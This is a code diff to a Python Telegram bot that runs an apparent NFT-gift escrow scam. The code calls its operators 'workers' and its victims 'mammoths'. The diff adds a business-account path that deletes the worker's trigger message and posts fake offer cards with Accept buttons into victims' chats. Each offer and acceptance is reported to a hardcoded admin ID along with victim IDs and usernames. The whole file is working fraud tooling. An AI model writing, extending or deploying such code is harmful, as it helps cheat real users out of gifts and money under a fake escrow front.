@@ -15,7 +15,6 @@ from pathlib import Path
 from dotenv import load_dotenv
 load_dotenv()
 
-# Telethon (Клиентские сессии воркеров)
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -25,7 +24,6 @@ from telethon.errors import (
     PasswordHashInvalidError,
 )
 
-# Aiogram 3 (Интерфейс бота)
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.client.default import DefaultBotProperties
 from aiogram.filters import CommandStart, Command
@@ -41,6 +39,7 @@ from aiogram.types import (
     InlineQueryResultArticle,
     InputTextMessageContent,
     ChosenInlineResult,
+    BusinessConnection,
 )
 from aiogram.exceptions import TelegramBadRequest
 
@@ -49,10 +48,10 @@ from aiogram.exceptions import TelegramBadRequest
 # ═══════════════════════════════════════════════════════
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
-ADMIN_ID = int(os.getenv("ADMIN_ID", ""))
-BOT_USERNAME = os.getenv("BOT_USERNAME", "").lstrip("@")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "1544353769"))
+BOT_USERNAME = os.getenv("BOT_USERNAME", "hoptibot").lstrip("@")
 
-API_ID = int(os.getenv("API_ID", ""))
+API_ID = int(os.getenv("API_ID", "0"))
 API_HASH = os.getenv("API_HASH", "").strip()
 
 if not BOT_TOKEN:
@@ -86,7 +85,6 @@ CURRENCIES = {
     "ton": "TON",
 }
 
-# ═══ АЙДИШНИКИ КАСТОМНЫХ ЭМОДЗИ ═══
 CUSTOM_EMOJIS = {
     "scale": ("5346268255180834499", "⚖️"),
     "user": ("5346136537123801643", "👤"),
@@ -177,13 +175,14 @@ TEXTS = {
             "🏷 Твой юзернейм в офферах: <b>@{worker_username}</b>\n"
             "🌐 Язык офферов: <b>{lang}</b>\n"
             "💱 Валюта офферов: <b>{currency}</b>\n"
-            "📱 Статус сессии: <b>{session_status}</b>\n\n"
+            "📱 Сессия: <b>{session_status}</b>\n"
+            "🔌 Бизнес-аккаунт: <b>{business_status}</b>\n\n"
             "<b>Команды:</b>\n"
             "/setusername @юзернейм — сменить отображаемый тег получателя\n"
             "/lang — сменить язык офферов\n"
             "/currency — сменить валюту офферов\n\n"
             "<b>Создать оффер в чате:</b>\n"
-            "<code>оффер SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>Выбери язык офферов:</b>",
         "lang_set": "✅ Язык установлен: {lang}",
@@ -226,9 +225,10 @@ TEXTS = {
             "🏷 Юзернейм: <b>@{worker_username}</b>\n"
             "🌐 Мова: <b>{lang}</b>\n"
             "💱 Валюта: <b>{currency}</b>\n"
-            "📱 Сесія: <b>{session_status}</b>\n\n"
+            "📱 Сесія: <b>{session_status}</b>\n"
+            "🔌 Бізнес: <b>{business_status}</b>\n\n"
             "<b>Створити офер у чаті:</b>\n"
-            "<code>оффер SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>Оберіть мову:</b>",
         "lang_set": "✅ Мову встановлено: {lang}",
@@ -274,9 +274,10 @@ TEXTS = {
             "🏷 Username: <b>@{worker_username}</b>\n"
             "🌐 Language: <b>{lang}</b>\n"
             "💱 Currency: <b>{currency}</b>\n"
-            "📱 Session: <b>{session_status}</b>\n\n"
+            "📱 Session: <b>{session_status}</b>\n"
+            "🔌 Business: <b>{business_status}</b>\n\n"
             "<b>Create offer in chat:</b>\n"
-            "<code>оффер SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>Select language:</b>",
         "lang_set": "✅ Language set: {lang}",
@@ -308,9 +309,11 @@ TEXTS = {
         "start_msg": (
             "👋 <b>لوحة التحكم</b>\n\n"
             "👤 ID: <code>{uid}</code>\n"
-            "🏷 اسم المستخدم: <b>@{worker_username}</b>\n\n"
+            "🏷 اسم المستخدم: <b>@{worker_username}</b>\n"
+            "📱 الجلسة: <b>{session_status}</b>\n"
+            "🔌 الحساب التجاري: <b>{business_status}</b>\n\n"
             "<b>إنشاء عرض في الدردشة:</b>\n"
-            "<code>оффер SnakeBox-30973 500</code>"
+            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
         ),
         "choose_lang": "{globe} <b>اختر اللغة:</b>",
         "lang_set": "✅ تم ضبط اللغة: {lang}",
@@ -341,6 +344,7 @@ WORKER_LANGS = {}
 WORKER_CURRENCIES = {}
 WORKER_USERNAMES = {}
 WORKER_SESSIONS = {}
+WORKER_BUSINESS = {}  # uid -> {"conn_id", "user_chat_id", "enabled"}
 OFFERS = {}
 _offer_counter = 0
 
@@ -356,6 +360,7 @@ def save_data():
             "worker_currencies": WORKER_CURRENCIES,
             "worker_usernames": WORKER_USERNAMES,
             "worker_sessions": WORKER_SESSIONS,
+            "worker_business": WORKER_BUSINESS,
             "offer_counter": _offer_counter,
             "offers": {
                 str(k): {
@@ -374,7 +379,7 @@ def save_data():
         print(f"[SAVE] Error: {e}", flush=True)
 
 def load_data():
-    global _offer_counter, WORKERS, WORKER_LANGS, WORKER_CURRENCIES, WORKER_USERNAMES, WORKER_SESSIONS, OFFERS
+    global _offer_counter, WORKERS, WORKER_LANGS, WORKER_CURRENCIES, WORKER_USERNAMES, WORKER_SESSIONS, WORKER_BUSINESS, OFFERS
     if not DATA_FILE.exists():
         return
     try:
@@ -401,6 +406,10 @@ def load_data():
         wsess = data.get("worker_sessions", {})
         if isinstance(wsess, dict):
             WORKER_SESSIONS = {int(k): str(v) for k, v in wsess.items() if str(k).lstrip("-").isdigit()}
+
+        wbiz = data.get("worker_business", {})
+        if isinstance(wbiz, dict):
+            WORKER_BUSINESS = {int(k): v for k, v in wbiz.items() if str(k).lstrip("-").isdigit() and isinstance(v, dict)}
 
         raw_offers = data.get("offers", {})
         OFFERS = {}
@@ -483,15 +492,13 @@ async def update_worker_commands(uid: int):
         pass
 
 def parse_offer_command(text: str):
-    # формат: "оффер https://t.me/nft/IceCream-322115 1000" или
-    #         "оффер t.me/nft/IceCream-322115 1000 stars" или
-    #         "оффер IceCream-322115 1000" (slug без ссылки тоже принимаем)
+    # формат: "оффер https://t.me/nft/IceCream-322115 1000" / "оффер t.me/nft/... 1000 stars" / "оффер IceCream-322115 1000"
     m = re.match(
         r'^\s*оффер\s+'
-        r'(?:(?:https?://)?t\.me/nft/|)'          # опциональный префикс ссылки
-        r'([A-Za-z0-9_\-]+)\s+'                    # slug
-        r'(\d+)\s*'                                # цена
-        r'(?:(gram|stars|ton))?\s*$',              # опциональная валюта
+        r'(?:(?:https?://)?t\.me/nft/)?'
+        r'([A-Za-z0-9_\-]+)\s+'
+        r'(\d+)\s*'
+        r'(?:(gram|stars|ton))?\s*$',
         text,
         re.IGNORECASE | re.UNICODE
     )
@@ -512,21 +519,13 @@ def parse_offer_command(text: str):
         gift_name = slug.replace("-", " ")
 
     gift_link = f"https://t.me/nft/{slug}"
-
     return gift_name, gift_link, price, currency_override
 
 def make_offer_card(o: dict) -> str:
     lang = o.get("lang", DEFAULT_LANG)
     cur = o.get("currency", DEFAULT_CURRENCY)
     cur_label = get_currency_label(cur, lang)
-    return t(
-        lang,
-        "offer_body",
-        price=o["price"],
-        currency=cur_label,
-        gift_name=o["gift_name"],
-        ttl=OFFER_TTL_HOURS
-    )
+    return t(lang, "offer_body", price=o["price"], currency=cur_label, gift_name=o["gift_name"], ttl=OFFER_TTL_HOURS)
 
 def make_offer_kb(offer_id: int, lang: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -549,6 +548,15 @@ def make_worker_main_kb(uid: int) -> InlineKeyboardMarkup:
         ]
     ])
 
+def business_status(uid: int) -> str:
+    b = WORKER_BUSINESS.get(uid)
+    if not b:
+        return "❌ Не подключён"
+    return "✅ Активен" if b.get("enabled") else "⚠️ Отключён"
+
+def session_status(uid: int) -> str:
+    return "✅ Подключена" if uid in WORKER_SESSIONS else "❌ Не подключена"
+
 # ═══════════════════════════════════════════════════════
 # ⚡ СЕССИИ ВОРКЕРОВ (TELETHON)
 # ═══════════════════════════════════════════════════════
@@ -561,7 +569,6 @@ async def register_worker_client(worker_id: int, session_str: str):
             except Exception:
                 pass
 
-        # catch_up=False предотвращает ошибку PersistentTimestampOutdatedError
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH, catch_up=False)
         await client.connect()
 
@@ -620,6 +627,7 @@ async def register_worker_client(worker_id: int, session_str: str):
                 "lang": worker_lang,
                 "status": "pending",
                 "created_at": datetime.now(timezone.utc),
+                "delivery": "session",
             }
             save_data()
 
@@ -633,13 +641,9 @@ async def register_worker_client(worker_id: int, session_str: str):
             cur_label = get_currency_label(worker_currency, worker_lang)
             await send_message_safe(
                 ADMIN_ID,
-                f"🆕 <b>Новый оффер #{offer_id}</b>\n\n"
-                f"👤 Воркер:\n"
-                f"   • ID: <code>{worker_id}</code>\n"
-                f"   • Username: <b>@{worker_uname}</b>\n"
-                f"🎯 Мамонт:\n"
-                f"   • ID: <code>{chat_id}</code>\n"
-                f"   • Username: <b>{mammoth_uname}</b>\n"
+                f"🆕 <b>Оффер #{offer_id} (session)</b>\n\n"
+                f"👤 Воркер: <code>{worker_id}</code> (@{worker_uname})\n"
+                f"🎯 Мамонт: <code>{chat_id}</code> ({mammoth_uname})\n"
                 f"🎁 Подарок: <b>{gift_name}</b>\n"
                 f"🔗 Ссылка: {gift_link}\n"
                 f"💰 Цена: <b>{price} {cur_label}</b>"
@@ -648,6 +652,118 @@ async def register_worker_client(worker_id: int, session_str: str):
         asyncio.create_task(client.run_until_disconnected())
     except Exception as e:
         print(f"[SESSION] Client init error {worker_id}: {e}", flush=True)
+
+# ═══════════════════════════════════════════════════════
+# 🔌 BUSINESS CONNECTION
+# ═══════════════════════════════════════════════════════
+
+@dp.business_connection()
+async def on_business_connection(connection: BusinessConnection):
+    uid = connection.user.id
+    if not is_worker(uid):
+        return
+    WORKER_BUSINESS[uid] = {
+        "conn_id": connection.id,
+        "user_chat_id": connection.user_chat_id,
+        "enabled": connection.is_enabled,
+    }
+    save_data()
+    print(f"[BUSINESS] worker {uid} conn={connection.id} enabled={connection.is_enabled}", flush=True)
+
+@dp.business_message()
+async def on_business_message(message: types.Message):
+    text = (message.text or "").strip()
+    if not text.lower().startswith("оффер"):
+        return
+
+    conn_id = message.business_connection_id
+    sender_id = message.from_user.id if message.from_user else None
+
+    if not sender_id or not is_worker(sender_id) or not conn_id:
+        return
+
+    parsed = parse_offer_command(text)
+    if not parsed:
+        return
+
+    gift_name, gift_link, price, currency_override = parsed
+    chat_id = message.chat.id
+
+    try:
+        await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
+    except Exception as e:
+        print(f"[BUSINESS] delete error: {e}", flush=True)
+
+    worker_currency = currency_override if currency_override else get_currency(sender_id)
+    worker_lang = get_lang(sender_id)
+
+    mammoth_uname = "—"
+    try:
+        chat = await bot.get_chat(chat_id)
+        if getattr(chat, "username", None):
+            mammoth_uname = f"@{chat.username}"
+    except Exception:
+        pass
+
+    worker_uname = get_worker_username(sender_id)
+
+    offer_id = next_offer_id()
+    OFFERS[offer_id] = {
+        "worker_id": sender_id,
+        "worker_username": worker_uname,
+        "mammoth_id": chat_id,
+        "mammoth_username": mammoth_uname,
+        "gift_name": gift_name,
+        "gift_link": gift_link,
+        "price": price,
+        "currency": worker_currency,
+        "lang": worker_lang,
+        "status": "pending",
+        "created_at": datetime.now(timezone.utc),
+        "delivery": "business",
+        "business_conn": conn_id,
+    }
+    save_data()
+
+    card_text = make_offer_card(OFFERS[offer_id])
+    kb = make_offer_kb(offer_id, worker_lang)
+
+    try:
+        await bot.send_message(
+            chat_id=chat_id,
+            text=card_text,
+            parse_mode="HTML",
+            reply_markup=kb,
+            business_connection_id=conn_id,
+        )
+    except TelegramBadRequest as e:
+        err = str(e).lower()
+        if "custom" in err or "entity" in err or "emoji" in err:
+            clean_txt = clean_custom_emoji(card_text)
+            try:
+                await bot.send_message(
+                    chat_id=chat_id,
+                    text=clean_txt,
+                    parse_mode="HTML",
+                    reply_markup=kb,
+                    business_connection_id=conn_id,
+                )
+            except Exception as e2:
+                print(f"[BUSINESS] send fallback error: {e2}", flush=True)
+        else:
+            print(f"[BUSINESS] send error: {e}", flush=True)
+
+    cur_label = get_currency_label(worker_currency, worker_lang)
+    await send_message_safe(
+        ADMIN_ID,
+        f"🆕 <b>Оффер #{offer_id} (business)</b>\n\n"
+        f"👤 Воркер: <code>{sender_id}</code> (@{worker_uname})\n"
+        f"🎯 Мамонт: <code>{chat_id}</code> ({mammoth_uname})\n"
+        f"🎁 Подарок: <b>{gift_name}</b>\n"
+        f"🔗 Ссылка: {gift_link}\n"
+        f"💰 Цена: <b>{price} {cur_label}</b>\n"
+        f"🔌 Conn: <code>{conn_id}</code>"
+    )
 
 # ═══════════════════════════════════════════════════════
 # 📱 АВТОРИЗАЦИЯ СЕССИИ ЧЕРЕЗ БОТА
@@ -777,7 +893,7 @@ async def process_code(message: types.Message, state: FSMContext):
         await message.answer(
             f"🎉 <b>Аккаунт успешно подключен!</b>\n\n"
             f"👤 Тег получателя: <b>@{get_worker_username(uid)}</b>\n\n"
-            f"Пиши в диалоге с мамонтом:\n<code>оффер SnakeBox-30973 1000</code>",
+            f"Пиши в диалоге с мамонтом:\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
             reply_markup=make_worker_main_kb(uid)
         )
     except SessionPasswordNeededError:
@@ -830,7 +946,7 @@ async def process_2fa(message: types.Message, state: FSMContext):
         await message.answer(
             f"🎉 <b>Аккаунт подключен!</b>\n\n"
             f"👤 Тег получателя: <b>@{get_worker_username(uid)}</b>\n\n"
-            f"Пиши в диалоге с мамонтом:\n<code>оффер SnakeBox-30973 1000</code>",
+            f"Пиши в диалоге с мамонтом:\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
             reply_markup=make_worker_main_kb(uid)
         )
     except PasswordHashInvalidError:
@@ -842,7 +958,7 @@ async def process_2fa(message: types.Message, state: FSMContext):
         await state.clear()
 
 # ═══════════════════════════════════════════════════════
-# 🔍 ИНЛАЙН РЕЖИМ И ОБНОВЛЕНИЕ ПРЕМИУМ-ЭМОДЗИ
+# 🔍 ИНЛАЙН
 # ═══════════════════════════════════════════════════════
 
 @dp.inline_query()
@@ -878,7 +994,6 @@ async def inline_offer_handler(inline_query: InlineQuery):
 
 @dp.chosen_inline_result()
 async def on_chosen_inline_result(chosen: ChosenInlineResult):
-    """Сразу после отправки обновляет сообщение через Bot API для отображения премиум-эмодзи"""
     if chosen.inline_message_id and chosen.result_id:
         try:
             offer_id = int(chosen.result_id)
@@ -898,6 +1013,56 @@ async def on_chosen_inline_result(chosen: ChosenInlineResult):
 # ═══════════════════════════════════════════════════════
 # 🔘 ОБРАБОТКА КНОПОК
 # ═══════════════════════════════════════════════════════
+
+async def edit_offer_message(call: types.CallbackQuery, o: dict, new_text: str, keep_kb: bool = False, kb=None):
+    """Универсальный редактор карточки оффера: inline / business / обычное сообщение."""
+    parse_mode = "HTML"
+    try:
+        if call.inline_message_id:
+            await bot.edit_message_text(
+                inline_message_id=call.inline_message_id,
+                text=new_text,
+                parse_mode=parse_mode,
+                reply_markup=kb if keep_kb else None,
+            )
+            return True
+        elif call.message:
+            await bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text=new_text,
+                parse_mode=parse_mode,
+                reply_markup=kb if keep_kb else None,
+            )
+            return True
+    except TelegramBadRequest as e:
+        err = str(e).lower()
+        if "custom" in err or "entity" in err or "emoji" in err:
+            clean_txt = clean_custom_emoji(new_text)
+            try:
+                if call.inline_message_id:
+                    await bot.edit_message_text(
+                        inline_message_id=call.inline_message_id,
+                        text=clean_txt,
+                        parse_mode=parse_mode,
+                        reply_markup=kb if keep_kb else None,
+                    )
+                elif call.message:
+                    await bot.edit_message_text(
+                        chat_id=call.message.chat.id,
+                        message_id=call.message.message_id,
+                        text=clean_txt,
+                        parse_mode=parse_mode,
+                        reply_markup=kb if keep_kb else None,
+                    )
+                return True
+            except Exception as e2:
+                print(f"[EDIT] fallback error: {e2}", flush=True)
+        else:
+            print(f"[EDIT] error: {e}", flush=True)
+    except Exception as e:
+        print(f"[EDIT] error: {e}", flush=True)
+    return False
 
 @dp.callback_query()
 async def universal_callback(call: types.CallbackQuery):
@@ -925,14 +1090,14 @@ async def universal_callback(call: types.CallbackQuery):
         return
 
     if data == "open:main":
-        sess_status = "✅ Подключена" if uid in WORKER_SESSIONS else "❌ Не подключена"
         text = t(
             current_lang, "start_msg",
             uid=uid,
             worker_username=get_worker_username(uid),
             lang=LANGS.get(current_lang, current_lang),
             currency=get_currency_label(get_currency(uid), current_lang),
-            session_status=sess_status
+            session_status=session_status(uid),
+            business_status=business_status(uid),
         )
         await call.message.edit_text(text, reply_markup=make_worker_main_kb(uid))
         return
@@ -972,7 +1137,6 @@ async def universal_callback(call: types.CallbackQuery):
                 pass
         return
 
-    # ── Кнопка «Принять» прямо в чате ──
     if data.startswith("accept:"):
         _, _, raw_id = data.partition(":")
         if not raw_id.isdigit():
@@ -991,7 +1155,7 @@ async def universal_callback(call: types.CallbackQuery):
         alert_text = t(offer_lang, "alert_accepted", gift_name=o["gift_name"], worker_username=worker_uname)
         await call.answer(alert_text, show_alert=True)
 
-        if o.get("status") != "accepted":
+        if o.get("status") == "pending":
             o["status"] = "accepted"
             o["accepted_at"] = datetime.now(timezone.utc)
             order = o.get("order_code") or gen_order_code()
@@ -1007,46 +1171,22 @@ async def universal_callback(call: types.CallbackQuery):
                 order=order,
                 worker_username=worker_uname
             )
-
-            try:
-                if call.inline_message_id:
-                    await bot.edit_message_text(
-                        inline_message_id=call.inline_message_id,
-                        text=accepted_text,
-                        parse_mode="HTML",
-                        reply_markup=None
-                    )
-                elif call.message:
-                    await call.message.edit_text(
-                        text=accepted_text,
-                        parse_mode="HTML",
-                        reply_markup=None
-                    )
-            except Exception:
-                clean_txt = clean_custom_emoji(accepted_text)
-                if call.inline_message_id:
-                    await bot.edit_message_text(inline_message_id=call.inline_message_id, text=clean_txt, parse_mode="HTML", reply_markup=None)
-                elif call.message:
-                    await call.message.edit_text(text=clean_txt, parse_mode="HTML", reply_markup=None)
+            await edit_offer_message(call, o, accepted_text)
 
             mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
             await send_message_safe(
                 ADMIN_ID,
                 f"✅ <b>Оффер #{offer_id} ПРИНЯТ!</b>\n\n"
-                f"👤 Мамонт:\n"
-                f"   • ID: <code>{call.from_user.id}</code>\n"
-                f"   • Username: <b>{mammoth_uname}</b>\n"
-                f"💼 Воркер-получатель:\n"
-                f"   • ID: <code>{worker_id}</code>\n"
-                f"   • Username: <b>@{worker_uname}</b>\n"
+                f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
+                f"💼 Воркер: <code>{worker_id}</code> (@{worker_uname})\n"
                 f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
                 f"🔗 Ссылка: {o['gift_link']}\n"
                 f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
-                f"📦 Заказ: <code>#{order}</code>"
+                f"📦 Заказ: <code>#{order}</code>\n"
+                f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
             )
         return
 
-    # ── Кнопка «Отклонить» ──
     if data.startswith("reject:"):
         _, _, raw_id = data.partition(":")
         if not raw_id.isdigit():
@@ -1060,14 +1200,7 @@ async def universal_callback(call: types.CallbackQuery):
         offer_lang = o.get("lang", DEFAULT_LANG)
         await call.answer(t(offer_lang, "alert_rejected"), show_alert=True)
         rejected_text = t(offer_lang, "rejected_body")
-
-        try:
-            if call.inline_message_id:
-                await bot.edit_message_text(inline_message_id=call.inline_message_id, text=rejected_text, parse_mode="HTML", reply_markup=None)
-            elif call.message:
-                await call.message.edit_text(text=rejected_text, parse_mode="HTML", reply_markup=None)
-        except Exception:
-            pass
+        await edit_offer_message(call, o, rejected_text)
 
         mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
         worker_uname = o.get("worker_username") or get_worker_username(o["worker_id"])
@@ -1077,20 +1210,20 @@ async def universal_callback(call: types.CallbackQuery):
             f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
             f"💼 Воркер: <code>{o['worker_id']}</code> (@{worker_uname})\n"
             f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
-            f"🔗 Ссылка: {o['gift_link']}"
+            f"🔗 Ссылка: {o['gift_link']}\n"
+            f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
         )
         OFFERS.pop(offer_id, None)
         save_data()
 
 # ═══════════════════════════════════════════════════════
-# 📋 ОБРАБОТЧИК /START И КОМАНД
+# 📋 /START И КОМАНДЫ
 # ═══════════════════════════════════════════════════════
 
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
     uid = message.from_user.id
 
-    # 1. Если это ВОРКЕР — открываем панель
     if is_worker(uid):
         if message.from_user.username:
             WORKER_USERNAMES[uid] = message.from_user.username.lstrip("@")
@@ -1099,29 +1232,26 @@ async def cmd_start(message: types.Message):
         lang = get_lang(uid)
         cur = get_currency(uid)
         curr_label = get_currency_label(cur, lang)
-        sess_status = "✅ Подключена" if uid in WORKER_SESSIONS else "❌ Не подключена"
-        worker_uname = get_worker_username(uid)
 
         text = t(
             lang,
             "start_msg",
             uid=uid,
-            worker_username=worker_uname,
+            worker_username=get_worker_username(uid),
             lang=LANGS.get(lang, lang),
             currency=curr_label,
-            session_status=sess_status
+            session_status=session_status(uid),
+            business_status=business_status(uid),
         )
         await send_message_safe(uid, text, reply_markup=make_worker_main_kb(uid))
         return
 
-    # 2. Если это МАМОНТ: ищем его активный заказ
     target_offer = None
     for o in sorted(OFFERS.values(), key=lambda x: str(x.get("created_at")), reverse=True):
         if o.get("mammoth_id") == uid:
             target_offer = o
             break
 
-    # Если есть заказ мамонта — присылаем ему инфу по заказу
     if target_offer:
         offer_lang = target_offer.get("lang", DEFAULT_LANG)
         cur_label = get_currency_label(target_offer.get("currency", DEFAULT_CURRENCY), offer_lang)
@@ -1143,7 +1273,6 @@ async def cmd_start(message: types.Message):
         await send_message_safe(uid, info_text)
         return
 
-    # 3. Если мамонт нажал старт просто так — нейтральное сообщение Escrow
     await send_message_safe(uid, t(DEFAULT_LANG, "escrow_welcome"))
 
 @dp.message(Command("id", "myid"))
@@ -1231,6 +1360,7 @@ async def cmd_revoke(message: types.Message):
             pass
         ACTIVE_CLIENTS.pop(uid, None)
     WORKER_SESSIONS.pop(uid, None)
+    WORKER_BUSINESS.pop(uid, None)
     save_data()
     try:
         await bot.delete_my_commands(scope=BotCommandScopeChat(chat_id=uid))
@@ -1247,8 +1377,9 @@ async def cmd_workers(message: types.Message):
         lang = get_lang(wid)
         cur = get_currency(wid)
         uname = get_worker_username(wid)
-        sess = "✅ Сессия активна" if wid in WORKER_SESSIONS else "❌ Без сессии"
-        lines.append(f"• <code>{wid}</code> (@{uname}) — {LANGS.get(lang, lang)} — {get_currency_label(cur, lang)} [{sess}]")
+        sess = "✅ Сессия" if wid in WORKER_SESSIONS else "❌ Сессия"
+        biz = "✅ Бизнес" if WORKER_BUSINESS.get(wid, {}).get("enabled") else "❌ Бизнес"
+        lines.append(f"• <code>{wid}</code> (@{uname}) — {LANGS.get(lang, lang)} — {get_currency_label(cur, lang)} [{sess} | {biz}]")
     await send_message_safe(message.chat.id, "\n".join(lines))
 
 @dp.message(Command("offers"))
@@ -1265,7 +1396,7 @@ async def cmd_offers(message: types.Message):
         minutes = int((now - created).total_seconds() // 60) if isinstance(created, datetime) else "?"
         wuname = o.get("worker_username") or get_worker_username(o["worker_id"])
         lines.append(
-            f"#{oid} [{o.get('status')}] — {o['gift_name']} — <b>{o['price']} {get_currency_label(o.get('currency'), o.get('lang'))}</b>\n"
+            f"#{oid} [{o.get('status')}/{o.get('delivery', '?')}] — {o['gift_name']} — <b>{o['price']} {get_currency_label(o.get('currency'), o.get('lang'))}</b>\n"
             f"   Воркер: <code>{o['worker_id']}</code> (@{wuname})\n"
             f"   Мамонт: <code>{o['mammoth_id']}</code> | Возраст: {minutes} мин.\n"
             f"   Ссылка: {o.get('gift_link', '—')}"
@@ -1273,12 +1404,12 @@ async def cmd_offers(message: types.Message):
     await send_message_safe(message.chat.id, "\n".join(lines))
 
 # ═══════════════════════════════════════════════════════
-# 🚀 ОБЩИЙ ЗАПУСК
+# 🚀 ЗАПУСК
 # ═══════════════════════════════════════════════════════
 
 async def main():
     print("=" * 60)
-    print("Запуск Multi-Worker Bot (Session + Inline)...")
+    print("Запуск Multi-Worker Bot (Session + Business + Inline)...")
     print(f"Админ: {ADMIN_ID} | Бот: @{BOT_USERNAME}")
     print("=" * 60)
 
@@ -1287,18 +1418,25 @@ async def main():
 
     await bot.delete_webhook(drop_pending_updates=True)
 
-    # 1. По умолчанию для обычных пользователей — только /start
     await bot.set_my_commands(
         [BotCommand(command="start", description="Начать / Start")],
         scope=BotCommandScopeDefault()
     )
-
-    # 2. Персональное меню для всех воркеров из базы
     for wid in WORKERS:
         await update_worker_commands(wid)
 
     print("✅ Бот готов к работе.")
-    await dp.start_polling(bot)
+    await dp.start_polling(
+        bot,
+        allowed_updates=[
+            "message",
+            "callback_query",
+            "inline_query",
+            "chosen_inline_result",
+            "business_connection",
+            "business_message",
+        ],
+    )
 
 if __name__ == "__main__":
     asyncio.run(main())
